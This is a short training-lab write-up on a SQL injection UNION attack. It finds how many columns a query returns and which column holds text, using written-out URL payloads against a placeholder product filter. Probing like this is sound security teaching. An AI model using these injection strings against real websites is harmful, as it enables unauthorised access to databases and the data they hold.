Difficulty : `Practitioner`

## ðŸŽ¯ Goal

To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided.

Value provided: '`abc`'

## âœ… Solution

First we need to know how many columns are returned by the query:

````text
<website>/filter?category=Pets' UNION SELECT NULL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,NULL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,NULL,NULL--    # works
<website>/filter?category=Pets' UNION SELECT NULL,NULL,NULL,NULL--    # error!
````

We now know there are 3 columns. Time to find which one contains string data:

````text
<website>/filter?category=Pets' UNION SELECT 'abc',NULL,NULL--    # error!
<website>/filter?category=Pets' UNION SELECT NULL,'abc',NULL--    # works
<website>/filter?category=Pets' UNION SELECT NULL,NULL,'abc'--    # error!
````

The second column contains string.
